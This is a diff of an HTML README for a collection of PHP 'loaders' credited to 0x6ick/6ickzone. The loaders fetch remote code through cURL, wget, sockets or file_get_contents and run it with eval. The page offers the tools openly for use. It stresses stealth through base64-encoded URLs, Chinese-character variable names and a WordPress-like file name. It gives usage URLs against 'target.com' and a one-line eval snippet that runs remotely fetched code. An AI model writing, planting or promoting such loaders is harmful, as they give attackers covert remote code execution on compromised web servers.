@@ -1,5 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 </head>
 <body>
 
@@ -18,50 +21,47 @@
     <pre><code>/loader/wp-loader.php    # Main multi-mode loader panel
 /loader/b64loader.php           # One-liner base64 loader
 /loader/loadman.php             # Stealth loader (cURL + file_get_contents) with Mandarin variables
+/docs/                   # Optional per-mode documentation
 </code></pre>
   </div>
 
   <div class="section">
     <h2>✨ Available Loaders</h2>
+    
+    1. wp-loader.php
+Multi-mode loader panel with the following modes:
+- curl → Loader using cURL
+- curlman → Refactored curl loader
+- tmp → Temporary file-based loader
+- cache → Loader with cache mechanism
+- curlv2 → Alternative curl loader
+- wget → wget/curl + include method
+- socket → Raw socket GET loader
+- telegram → Author contact info
 
-    ### 1. wp-loader.php
+Usage:
+http://target.com/wp-loader.php?mode=curl
 
-**Multi-mode loader panel** with the following modes:
 
--   `curl` → Loader using cURL
--   `curlman` → Refactored curl loader
--   `tmp` → Temporary file-based loader
--   `cache` → Loader with cache mechanism
--   `curlv2` → Alternative curl loader
--   `wget` → wget/curl + include method
--   `socket` → Raw socket GET loader
--   `telegram` → Author contact info
+     2. b64loader.php
+One-liner base64 loader
+- Decodes a URL from base64 → fetches → executes via eval
+- Extremely short and stealthy
 
-**Usage:**
-    http://target.com/wp-loader.php?mode=curl
-
-    ### 2. b64loader.php
-
-**One-liner base64 loader**
-
--   Decodes a URL from base64 → fetches → executes via eval
--   Extremely short and stealthy
-
-**Example snippet:**
-
-```php
+Example snippet:
 <?= @eval("?>".file_get_contents(base64_decode("..."))); ?>
-'
 
-     ### 3. loadman.php
 
-**Stealth loader with Mandarin style**
-
+     3. loadman.php
+Stealth loader with Mandarin style
 - Function and variable names in Chinese characters (汉字)
-- Flow: `cURL` → fallback to `file_get_contents` → `eval`
+- Flow: cURL → fallback to file_get_contents → eval
 - Error output: "加载失败 (Failed to load)"
 
-**Usage:**
+Usage:
+http://target.com/loadman.php
+
+  </div>
 
   <hr>
 
@@ -75,7 +75,7 @@ Version 2, December 2004</code></pre>
   <div class="section">
     <h2>👤 Author</h2>
     <ul>
-      <li><strong>0x6ick (a.k.a 6ickzone)</strong></li>
+      <li><strong>0x6ick - 6ickzone</strong></li>
       <li>Telegram: <a href="https://t.me/Yungx6ick" target="_blank">@Yungx6ick</a></li>
     </ul>
   </div>
